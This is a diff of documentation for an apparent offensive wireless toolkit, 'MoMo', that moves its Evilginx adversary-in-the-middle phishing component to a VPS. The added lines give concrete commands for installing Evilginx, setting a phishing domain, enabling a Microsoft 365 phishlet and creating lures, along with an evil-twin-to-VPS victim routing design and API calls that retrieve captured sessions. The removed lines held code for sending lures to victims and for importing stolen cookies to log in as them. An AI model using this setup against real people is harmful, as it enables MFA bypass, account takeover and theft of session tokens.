@@ -2,9 +2,83 @@
 
 > **MFA Bypass through Adversary-in-the-Middle Session Hijacking**
 
-## Summary
+---
 
-MoMo's Evilginx integration enables **Multi-Factor Authentication (MFA) bypass** by capturing session cookies through transparent reverse proxying. Unlike traditional credential harvesting (which fails against 2FA), this approach captures the authenticated session token issued AFTER the victim completes all authentication steps.
+## ⚠️ IMPORTANT: Evilginx Moved to Dedicated VPS
+
+**As of v1.0.0, Evilginx has been moved to a dedicated VPS.**
+
+### Why?
+
+1. **Resource Requirements**: Evilginx needs public IP, ports 80/443, SSL certs
+2. **Domain Dependency**: Requires valid domain pointing to server
+3. **Pi Limitations**: Pi 5 typically behind NAT, no public IP
+4. **Operational Security**: Separate infrastructure for sensitive operations
+
+### New Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                    EVILGINX ARCHITECTURE v2.0                        │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  MoMo (Pi 5)                 Nexus (Pi 4)              VPS          │
+│  ───────────                 ───────────               ────          │
+│  • Evil Twin AP       ───►  • Route victim  ───►  • Evilginx3      │
+│  • Captive Portal            • Manage phishlets    • SSL/Domain     │
+│  • Redirect to VPS           • Session retrieval   • Cookie capture │
+│                                                                      │
+│  Victim connects to fake AP → Redirected to VPS → Session captured  │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### Local Evil Twin + Remote Evilginx
+
+The Evil Twin module on MoMo still works! Just point the captive portal to your VPS:
+
+```yaml
+# momo.yml
+eviltwin:
+  enabled: true
+  redirect_url: "https://your-phishing-domain.com/login"
+```
+
+---
+
+## VPS Evilginx Setup
+
+### Requirements
+
+- Ubuntu VPS (min $5/mo)
+- Public IP
+- Domain name (e.g., login.example.com)
+- Ports 80, 443 open
+
+### Installation
+
+```bash
+# On VPS
+wget https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx-linux-amd64.tar.gz
+tar -xzf evilginx-linux-amd64.tar.gz
+./evilginx
+
+# Configure
+config domain your-phishing-domain.com
+config ip YOUR_VPS_IP
+phishlets hostname microsoft365 login.your-phishing-domain.com
+phishlets enable microsoft365
+lures create microsoft365
+```
+
+### Recommended VPS Providers
+
+- **Vultr** - $5/mo, global locations
+- **DigitalOcean** - Reliable, good UI
+- **Linode** - Developer friendly
+- **Hetzner** - Cheap EU option
+
+---
 
 ## How It Works
 
@@ -15,11 +89,11 @@ MoMo's Evilginx integration enables **Multi-Factor Authentication (MFA) bypass**
 │                                                                      │
 │  ┌──────────┐    ┌─────────────┐    ┌──────────────┐    ┌────────┐  │
 │  │  Victim  │───▶│  Evil Twin  │───▶│   Evilginx   │───▶│  Real  │  │
-│  │          │    │   (Rogue AP) │    │  (AiTM Proxy)│    │  Site  │  │
+│  │          │    │ (MoMo Pi 5) │    │   (VPS)      │    │  Site  │  │
 │  └──────────┘    └─────────────┘    └──────────────┘    └────────┘  │
 │       │                                     │                  │     │
 │       │  1. Connect to fake AP              │                  │     │
-│       │  2. Redirect to phishing URL        │                  │     │
+│       │  2. Redirect to VPS phishing URL    │                  │     │
 │       │  3. Enter credentials ──────────────┼─────────────────▶│     │
 │       │  4. Complete 2FA ───────────────────┼─────────────────▶│     │
 │       │  5. Session cookie issued ◀─────────┼──────────────────│     │
@@ -43,135 +117,22 @@ MoMo's Evilginx integration enables **Multi-Factor Authentication (MFA) bypass**
 | Victim notices fake URL | Victim sees real site content |
 | Account access requires password | Account access via cookie import |
 
-## Components
+---
 
-### 1. Evilginx Manager
-Controls the evilginx3 binary process:
-- Start/Stop proxy server
-- Monitor captured sessions
-- Track statistics
+## Nexus Integration (Future)
 
-### 2. Phishlet Manager
-Manages target configurations:
-- **5 Built-in Phishlets:**
-  - Microsoft 365 / Office 365
-  - Google Accounts
-  - Okta SSO
-  - LinkedIn
-  - GitHub
-- Custom phishlet creation
-- YAML import/export
+Control Evilginx VPS via Nexus dashboard:
 
-### 3. Session Manager
-Handles captured credentials:
-- Store sessions with cookies
-- Export in multiple formats (JSON, curl, Netscape)
-- Track validity/expiration
-- Generate reports
-
-### 4. Lure Generator
-Creates phishing URLs:
-- Unique tracking IDs
-- Custom redirect URLs
-- URL parameters for targeting
-
-## API Endpoints
-
-```
-GET  /api/evilginx/status              # Check proxy status
-POST /api/evilginx/start               # Start evilginx proxy
-POST /api/evilginx/stop                # Stop evilginx proxy
-
-GET  /api/evilginx/phishlets           # List available phishlets
-POST /api/evilginx/phishlets/{name}/enable   # Enable phishlet
-POST /api/evilginx/phishlets/{name}/disable  # Disable phishlet
-
-GET  /api/evilginx/lures               # List active lures
-POST /api/evilginx/lures               # Create new lure
-DELETE /api/evilginx/lures/{id}        # Delete lure
-
-GET  /api/evilginx/sessions            # List captured sessions
-GET  /api/evilginx/sessions/{id}       # Get session details
-GET  /api/evilginx/sessions/{id}/export?format=json  # Export cookies
-DELETE /api/evilginx/sessions/{id}     # Delete session
-
-GET  /api/evilginx/sessions/report     # Generate text report
-GET  /api/evilginx/metrics             # Prometheus metrics
-```
-
-## Usage Example
-
-### 1. Start Attack
-```python
-from momo.infrastructure.evilginx import MockEvilginxManager
-
-# Initialize manager
-manager = MockEvilginxManager()
-await manager.start()
-
-# Enable target phishlet
-await manager.enable_phishlet("microsoft365")
-
-# Create phishing lure
-lure = await manager.create_lure(
-    "microsoft365",
-    redirect_url="https://office.com"
-)
-print(f"Send to victim: {lure.url}")
-```
-
-### 2. Check Captured Sessions
-```python
-sessions = await manager.get_sessions()
-for session in sessions:
-    print(f"Victim: {session['username']}")
-    print(f"Cookies: {session['cookies']}")
-```
-
-### 3. Export Cookies for Browser Import
 ```bash
-# Get cookies in JSON format (for browser extension)
-curl http://localhost:8080/api/evilginx/sessions/abc123/export?format=json
+# Via Nexus API (planned)
+curl -X POST http://nexus:8080/api/evilginx/lures \
+  -d '{"phishlet": "microsoft365", "redirect": "https://office.com"}'
 
-# Get as curl command
-curl http://localhost:8080/api/evilginx/sessions/abc123/export?format=curl
+# Get captured sessions
+curl http://nexus:8080/api/evilginx/sessions
 ```
 
-### 4. Import to Browser
-1. Export session cookies as JSON
-2. Install "Cookie Editor" browser extension
-3. Import JSON cookies
-4. Navigate to target site → **You're logged in as the victim!**
-
-## Configuration
-
-Add to `configs/momo.yml`:
-
-```yaml
-evilginx:
-  enabled: true
-  binary_path: /usr/local/bin/evilginx
-  external_ip: "YOUR_PUBLIC_IP"
-  https_port: 443
-  redirect_domain: "your-phishing-domain.com"
-  mock: false  # Set true for testing without binary
-```
-
-## Requirements
-
-- **evilginx3 binary**: https://github.com/kgretzky/evilginx2
-- **Valid domain**: Must point to MoMo server
-- **SSL certificate**: Auto-generated via Let's Encrypt
-- **Root access**: Required for ports 80/443
-
-## Security Considerations
-
-⚠️ **This tool is for authorized security testing only!**
-
-- Only use against systems you own or have explicit permission to test
-- Session hijacking is illegal without authorization
-- Captured credentials should be handled securely
-- Delete sessions after testing
+---
 
 ## Built-in Phishlets
 
@@ -183,42 +144,47 @@ evilginx:
 | `linkedin` | LinkedIn | li_at, JSESSIONID |
 | `github` | GitHub | user_session, _gh_sess |
 
-## Creating Custom Phishlets
+---
 
-```python
-from momo.infrastructure.evilginx import PhishletManager
+## Migration Notes
 
-manager = PhishletManager()
-phishlet = manager.create_custom_phishlet(
-    name="custom_target",
-    target_domain="internal.company.com",
-    login_subdomain="sso",
-    auth_cookies=["SESSION_ID", "AUTH_TOKEN"]
-)
-manager.save_phishlet(phishlet)
-```
+### Removed from MoMo
 
-## Metrics
+- `momo/infrastructure/evilginx/` (entire module)
+- `momo/apps/momo_plugins/evilginx_aitm.py`
+- `momo/apps/momo_web/evilginx_api.py`
+- `/api/evilginx/*` endpoints
 
-```
-momo_evilginx_status              # 1 if running, 0 if stopped
-momo_evilginx_sessions_total      # Total captured sessions
-momo_evilginx_lures_total         # Total lures created
-momo_evilginx_phishlets_active    # Active phishlets count
-```
+### Still Available on MoMo
 
-## Integration with Evil Twin
+- Evil Twin (captive portal can redirect to VPS)
+- `/api/eviltwin/*` endpoints
 
-Evilginx works seamlessly with MoMo's Evil Twin module:
+### Available on VPS
 
-1. **Evil Twin** creates rogue AP → Victim connects
-2. **Captive Portal** redirects to evilginx lure URL
-3. **Evilginx** proxies to real site → Captures session
-4. **Session Manager** stores cookies → Ready for export
+- Full Evilginx3 functionality
+- Phishlet management
+- Lure generation
+- Session capture
 
-This creates a **complete phishing infrastructure** in a portable device.
+### Future (via Nexus)
+
+- Remote VPS management API
+- Session sync to Nexus
+- Dashboard integration
 
 ---
 
-*Phase 0.9.0 - MoMo Wireless Security Platform*
+## Security Considerations
 
+⚠️ **This tool is for authorized security testing only!**
+
+- Only use against systems you own or have explicit permission to test
+- Session hijacking is illegal without authorization
+- Captured credentials should be handled securely
+- Delete sessions after testing
+- Use dedicated, isolated VPS infrastructure
+
+---
+
+*MoMo v1.6.0 - Evilginx moved to dedicated VPS*
